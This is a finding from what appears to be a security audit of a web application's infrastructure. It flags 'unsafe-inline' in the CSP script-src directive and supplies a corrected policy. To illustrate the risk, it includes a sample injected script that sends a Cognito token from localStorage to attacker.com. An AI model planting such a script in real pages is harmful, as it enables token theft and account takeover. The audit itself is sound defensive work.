### 4. 🔴 CRITICAL: CSP Contains `unsafe-inline` on script-src — UNRESOLVED

**Status**: Identical string to v4.3.0. The entire XSS mitigation layer is bypassed.

```yaml
# LIVE TEMPLATE - XSS PROTECTION NULLIFIED
ContentSecurityPolicy: "default-src 'self' ...; script-src 'self' 'unsafe-inline'; ..."
#                                                              ^^^^^^^^^^^^^^
# This single directive defeats the purpose of having a CSP.
# Any injected script tag will execute.
# Your WAF XSS rules and CSP provide ZERO additional protection
# over having no CSP at all.
```

**What unsafe-inline actually means**:
```html
<!-- With unsafe-inline, this executes if injected into your page -->
<script>
  // Exfiltrate Cognito tokens from localStorage
  fetch('https://attacker.com/steal?' + 
    encodeURIComponent(localStorage.getItem('CognitoIdentityServiceProvider...')))
</script>
```

```yaml
# CORRECTED - Remove unsafe-inline, add Stripe and Cognito domains
ContentSecurityPolicy: >-
  default-src 'self' https://fixyachips.com https://*.fixyachips.com;
  script-src 'self'
    https://cognito-idp.us-east-1.amazonaws.com
    https://js.stripe.com;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com data:;
  img-src 'self' data: https://*.fixyachips.com https://*.amazonaws.com;
  media-src 'self' https://*.fixyachips.com https://*.cloudfront.net blob:;
  connect-src 'self'
    https://*.amazonaws.com
    https://*.fixyachips.com
    https://cognito-idp.us-east-1.amazonaws.com;
  frame-src https://js.stripe.com;
  frame-ancestors 'none';
  upgrade-insecure-requests;
  block-all-mixed-content;
```

